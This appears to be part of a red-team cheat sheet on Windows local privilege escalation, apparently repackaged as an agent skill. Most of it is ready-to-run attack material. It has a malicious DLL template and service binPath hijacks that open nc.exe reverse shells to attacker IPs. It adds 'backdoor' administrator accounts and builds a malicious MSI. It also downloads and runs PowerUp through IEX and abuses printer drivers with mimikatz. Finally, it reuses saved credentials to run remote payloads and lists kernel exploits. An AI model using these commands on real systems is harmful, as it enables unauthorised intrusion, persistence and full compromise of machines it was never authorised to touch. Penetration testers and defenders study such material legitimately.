<!-- provenance: InternalAllTheThings docs/redteam/escalation/windows-privilege-escalation.md @ 203bb0c | part 3/5: Windows Privilege Escalation - Local EoP Techniques | converted for Agent Skills; see ../../NOTICE.md -->

# Windows Privilege Escalation - Local EoP Techniques

## EoP - Processes Enumeration and Tasks

* What processes are running?

    ```powershell
    tasklist /v
    net start
    sc query
    Get-Service
    Get-Process
    Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
    ```

* Which processes are running as "system"

    ```powershell
    tasklist /v /fi "username eq system"
    ```

* Do you have powershell magic?

    ```powershell
    REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
    ```

* List installed programs

    ```powershell
    Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
    ```

* List services

    ```powershell
    net start
    wmic service list brief
    tasklist /SVC
    ```

* Enumerate scheduled tasks

    ```powershell
    schtasks /query /fo LIST 2>nul | findstr TaskName
    schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
    ```

* Startup tasks

    ```powershell
    wmic startup get caption,command
    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
    dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
    ```

## EoP - Incorrect permissions in services

> A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.

Often, services are pointing to writable locations:

* Orphaned installs, not installed anymore but still exist in startup
* DLL Hijacking

    ```powershell
    # find missing DLL 
    - Find-PathDLLHijack PowerUp.ps1
    - Process Monitor : check for "Name Not Found"

    # compile a malicious dll
    - For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
    - For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

    # content of windows_dll.c
    #include <windows.h>
    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```

* PATH directories with weak permissions

    ```powershell
    $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
    $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

    $ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
    FOR /F %i in (Servicenames.txt) DO echo %i
    type Servicenames.txt
    FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
    ```

Alternatively you can use the Metasploit exploit : `exploit/windows/local/service_permissions`

Note to check file permissions you can use `cacls` and `icacls`
> icacls (Windows Vista +)
> cacls (Windows XP)

You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.

### Example with Windows 10 - CVE-2019-1322 UsoSvc

Prerequisite: Service account

```powershell
PS C:\Windows\system32> sc.exe stop UsoSvc
PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe qc usosvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

PS C:\Windows\system32> sc.exe start UsoSvc
```

### Example with Windows XP SP1 - upnphost

```powershell
# NOTE: spaces are mandatory for this exploit to work !
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

If it fails because of a missing dependency, try the following commands.

```powershell
sc config SSDPSRV start=auto
net start SSDPSRV
net stop upnphost
net start upnphost

sc config upnphost depend=""
```

Using [`accesschk`](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe) from Sysinternals or [accesschk-XP.exe - github.com/phackt](https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe)

```powershell
$ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

$ accesschk.exe -ucqv upnphost
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS

$ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
$ sc stop <vuln-service>
$ sc start <vuln-service>
$ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
$ sc stop <vuln-service>
$ sc start <vuln-service>
```

## EoP - Windows Subsystem for Linux (WSL)

> With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ `<distro>.exe --default-user root`. Now start your bind shell or reverse. - [Warlockobama's tweet](https://twitter.com/Warlockobama/status/1067890915753132032)

```powershell
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Alternatively you can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## EoP - Unquoted Service Paths

The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.

```powershell
# in CMD
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr /i /v """
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
# in PowerShell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

* Metasploit exploit : `exploit/windows/local/trusted_service_path`
* PowerUp exploit

    ```powershell
    # find the vulnerable application
    C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

    ...
    [*] Checking for unquoted service paths...
    ServiceName   : BBSvc
    Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
    StartName     : LocalSystem
    AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
    ...

    # automatic exploit
    Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
    ```

### Example

For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:

* `C:\Program.exe`
* `C:\Program Files.exe`

## EoP - $PATH Interception

Requirements:

* PATH contains a writable folder with low privileges.
* The writable folder is _before_ the folder that contains the legitimate binary.

EXAMPLE:

```powershell
# List contents of the PATH environment variable
# EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
$env:Path

# See permissions of the target folder
# EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
icacls.exe "C:\Program Files\nodejs\"

# Place our evil-file in that folder.
copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"
```

Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder.

## EoP - Named Pipes

1. Find named pipes: `[System.IO.Directory]::GetFiles("\\.\pipe\")`
2. Check named pipes DACL: `pipesec.exe <named_pipe>`
3. Reverse engineering software
4. Send data throught the named pipe : `program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`

## EoP - Kernel Exploitation

List of exploits kernel : [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Security Bulletin Table

| Security Bulletin                                                                             | KB        | Description                                      | Operating System                    |
| --------------------------------------------------------------------------------------------- | --------- | ------------------------------------------------ | ----------------------------------- |
| [MS17-017](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-017)           | KB4013081 | GDI Palette Objects Local Privilege Escalation   | Windows 7/8                         |
| [CVE-2017-8464](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-8464) | -         | LNK Remote Code Execution Vulnerability          | Windows 10/8.1/7/2016/2010/2008     |
| [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213) | -         | Windows COM Elevation of Privilege Vulnerability | Windows 10/8.1/7/2016/2010/2008     |
| [CVE-2018-0833](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-0833) | -         | SMBv3 Null Pointer Dereference Denial of Service | Windows 8.1/Server 2012 R2          |
| [CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120) | -         | Win32k Elevation of Privilege Vulnerability      | Windows 7 SP1/2008 SP2, 2008 R2 SP1 |
| [MS17-010](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-010)           | KB4013389 | Windows Kernel Mode Drivers                      | Windows 7/2008/2003/XP              |
| [MS16-135](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135)           | KB3199135 | Windows Kernel Mode Drivers                      | 2016                                |
| [MS16-111](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-111)           | KB3186973 | Kernel API                                       | Windows 10 10586 (32/64)/8.1        |
| [MS16-098](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098)           | KB3178466 | Kernel Driver                                    | Windows 8.1                         |
| [MS16-075](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075)           | KB3164038 | Hot Potato                                       | 2003/2008/7/8/2012                  |
| [MS16-034](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034)           | KB3143145 | Kernel Driver                                    | 2008/7/8/10/2012                    |
| [MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032)           | KB3143141 | Secondary Logon Handle                           | 2008/7/8/10/2012                    |
| [MS16-016](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-016)           | KB3136041 | WebDAV                                           | 2008/Vista/7                        |
| [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014)           | KB3134228 | Remote Code Execution                            | 2008/Vista/7                        |
| [MS03-026](https://www.exploit-db.com/exploits/66)                                            | KB823980  | Buffer Overrun In RPC Interface                  | NT/2000/XP/2003                     |

To cross compile a program from Kali, use the following command.

```powershell
Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
```

## EoP - Microsoft Windows Installer

### AlwaysInstallElevated

Using the `reg query` command, you can check the status of the `AlwaysInstallElevated` registry key for both the user and the machine. If both queries return a value of `0x1`, then `AlwaysInstallElevated` is enabled for both user and machine, indicating the system is vulnerable.

* Shell command

    ```powershell
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```

* PowerShell command

    ```powershell
    Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
    Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
    ```

Then create an MSI package and install it.

```powershell
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
msiexec /quiet /qn /i C:\evil.msi
```

Technique also available in :

* Metasploit : `exploit/windows/local/always_install_elevated`
* PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`

### CustomActions

> Custom Actions in MSI allow developers to specify scripts or executables to be run at various points during an installation

* [mgeeky/msidump](https://github.com/mgeeky/msidump) - a tool that analyzes malicious MSI installation packages, extracts files, streams, binary data and incorporates YARA scanner.
* [activescott/lessmsi](https://github.com/activescott/lessmsi) - A tool to view and extract the contents of an Windows Installer (.msi) file.
* [mandiant/msi-search](https://github.com/mandiant/msi-search) - This tool simplifies the task for red team operators and security teams to identify which MSI files correspond to which software and enables them to download the relevant file.

Enumerate products on the machine

```ps1
Get-WmiObject Win32_Product | Select Name, LocalPackage
wmic product get identifyingnumber,name,vendor,version,localpackage
```

Execute the repair process with the `/fa` parameter to trigger the CustomActions.
We can use both IdentifyingNumber `{E0F1535A-8414-5EF1-A1DD-E17EDCDC63F1}` or path to the installer `c:\windows\installer\XXXXXXX.msi`.
The repair will run with the NT SYSTEM account.

```ps1
$installed = Get-WmiObject Win32_Product
$string= $installed | select-string -pattern "PRODUCTNAME"
$string[0] -match '{\w{8}-\w{4}-\w{4}-\w{4}-\w{12}}'
Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa $($matches[0])"
```

Common mistakes in MSI installers:

* Missing quiet parameters: it will spawn `conhost.exe` as `NT SYSTEM`. Use `[CTRL]+[A]` to select some text in it, it will pause the execution.
    * conhost -> properties -> "legacy console mode" Link -> Internet Explorer -> CTRL+O –> cmd.exe
* GUI with direct actions: open a URL and start the browser then use the same scenario.
* Binaries/Scripts loaded from user writable paths: you might need to win the race condition.
* DLL hijacking/search order abusing
* PowerShell `-NoProfile` missing: Add custom commands into your profile

    ```ps1
    new-item -Path $PROFILE -Type file -Force
    echo "Start-Process -FilePath cmd.exe -Wait;" > $PROFILE
    ```

## EoP - Insecure GUI apps

Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.

Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## EoP - Evaluating Vulnerable Drivers

Look for vuln drivers loaded, we often don't spend enough time looking at this:

* [Living Off The Land Drivers](https://www.loldrivers.io/) is a curated list of Windows drivers used by adversaries to bypass security controls and carry out attacks. The project helps security professionals stay informed and mitigate potential threats.
* Native binary: DriverQuery.exe

    ```powershell
    PS C:\Users\Swissky> driverquery.exe /fo table /si
    Module Name  Display Name           Driver Type   Link Date
    ============ ====================== ============= ======================
    1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM
    3ware        3ware                  Kernel        5/18/2015 6:28:03 PM
    ACPI         Microsoft ACPI Driver  Kernel        12/9/1975 6:17:08 AM
    AcpiDev      ACPI Devices driver    Kernel        12/7/1993 6:22:19 AM
    acpiex       Microsoft ACPIEx Drive Kernel        3/1/2087 8:53:50 AM
    acpipagr     ACPI Processor Aggrega Kernel        1/24/2081 8:36:36 AM
    AcpiPmi      ACPI Power Meter Drive Kernel        11/19/2006 9:20:15 PM
    acpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM
    ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
    <SNIP>
    ```

* [matterpreter/OffensiveCSharp/DriverQuery](https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery)

    ```powershell
    PS C:\Users\Swissky> DriverQuery.exe --no-msft
    [+] Enumerating driver services...
    [+] Checking file signatures...
    Citrix USB Filter Driver
        Service Name: ctxusbm
        Path: C:\Windows\system32\DRIVERS\ctxusbm.sys
        Version: 14.11.0.138
        Creation Time (UTC): 17/05/2018 01:20:50
        Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US
        Signer: CN="Citrix Systems, Inc.", OU=XenApp(ClientSHA256), O="Citrix Systems, Inc.", L=Fort Lauderdale, S=Florida, C=US
    <SNIP>
    ```

## EoP - Printers

### Universal Printer

Create a Printer

```ps1
$printerName     = 'Universal Priv Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
 
Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
 
Add-PrinterDriver -Name       'Generic / Text Only'
Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
 
New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
```

Execute the driver

```ps1
$serverName  = 'dc.purple.lab'
$printerName = 'Universal Priv Printer'
$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName
```

### PrinterNightmare

```ps1
git clone https://github.com/Flangvik/DeployPrinterNightmare
PS C:\adversary> FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
[<3] @Flangvik - TrustedSec
[+] Copying C:\Windows\system32\mscms.dll to C:\Windows\system32\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Copying 64mimispool.dll to C:\Windows\system32\spool\drivers\x64\3\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Copying 32mimispool.dll to C:\Windows\system32\spool\drivers\W32X86\3\6cfbaf26f4c64131896df8a522546e9c.dll
[+] Adding printer driver => Generic / Text Only!
[+] Adding printer => EasySystemShell!
[+] Setting 64-bit Registry key
[+] Setting 32-bit Registry key
[+] Setting '*' Registry key
```

```ps1
PS C:\target> $serverName  = 'printer-installed-host'
PS C:\target> $printerName = 'EasySystemShell'
PS C:\target> $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
PS C:\target> Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
PS C:\target> Add-Printer -ConnectionName $fullprinterName
```

### Bring Your Own Vulnerability

[jacob-baines/concealed_position](https://github.com/jacob-baines/concealed_position)

* ACIDDAMAGE - [CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449) - Lexmark Universal Print Driver LPE
* RADIANTDAMAGE - [CVE-2021-38085](https://nvd.nist.gov/vuln/detail/CVE-2021-38085) - Canon TR150 Print Driver LPE
* POISONDAMAGE - [CVE-2019-19363](https://nvd.nist.gov/vuln/detail/CVE-2019-19363) - Ricoh PCL6 Print Driver LPE
* SLASHINGDAMAGE - [CVE-2020-1300](https://nvd.nist.gov/vuln/detail/CVE-2020-1300) - Windows Print Spooler LPE

```powershell
cp_server.exe -e ACIDDAMAGE
# Get-Printer
# Set the "Advanced Sharing Settings" -> "Turn off password protected sharing"
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
cp_client.exe -l -e ACIDDAMAGE
```

## EoP - Runas

Use the `cmdkey` to list the stored credentials on the machine.

```powershell
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Then you can use `runas` with the `/savecred` options in order to use the saved credentials.
The following example is calling a remote binary via an SMB share.

```powershell
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
```

Using `runas` with a provided set of credential.

```powershell
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

```powershell
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

## EoP - Abusing Shadow Copies

If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.

```powershell
# List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
  
# List shadow copies using diskshadow
diskshadow list shadows all
  
# Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
